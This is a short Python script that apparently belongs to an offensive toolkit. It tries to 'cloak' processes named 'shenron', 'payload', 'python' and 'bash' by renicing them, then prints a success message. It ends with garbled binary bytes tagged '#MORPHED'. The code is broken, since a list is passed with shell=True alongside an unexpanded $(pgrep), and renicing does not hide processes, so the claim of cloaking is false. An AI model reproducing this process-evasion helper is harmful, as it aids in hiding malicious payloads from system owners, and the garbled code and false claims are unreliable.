#!/usr/bin/env python3
import subprocess

def spectral_shroud():
    processes = ["shenron", "payload", "python", "bash"]
    for proc in processes:
        subprocess.run(["pgrep", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["renice", "+10", "-p", "$(pgrep " + proc + ")"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[âœ“] Processes cloaked in spectral shroud.")

if __name__ == "__main__":
    spectral_shroud()

&/ôy©MÆEøñ#ü­£J“”„°ò98`"‘q: ù˜^ÿ	#MORPHED

ÈÏä‡]‰Íé‘ã¦alucŠ$#MORPHED
